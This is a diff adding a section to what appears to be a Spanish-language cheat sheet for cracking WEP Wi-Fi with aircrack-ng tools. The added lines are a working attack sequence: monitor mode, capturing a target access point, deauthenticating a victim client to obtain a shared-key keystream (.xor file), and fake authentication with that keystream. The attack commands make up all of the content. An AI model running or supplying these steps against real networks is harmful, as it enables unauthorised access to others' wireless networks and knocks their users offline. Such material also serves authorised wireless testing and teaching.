@@ -100,3 +100,13 @@ aircrack-ng -0 CAPTURE-FILENAME
 ------------------------------
 SHARED KEY AUTHENTICATION
 ------------------------------
+
+airmon-ng start wlan0 [channel]
+airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+
+Fake Authentication con SKA
+aireplay-ng -0 1 (deauth) -a MAC-AP -c MAC-VICTIM mon0 (Para que muestre si es SKA)
+  Nos creará un .xor
+aireplay-ng -1 60 -e ESSID-AP -y .xor-FILE -a AP-MAC -h NUESTRA-MAC mon0
+
+
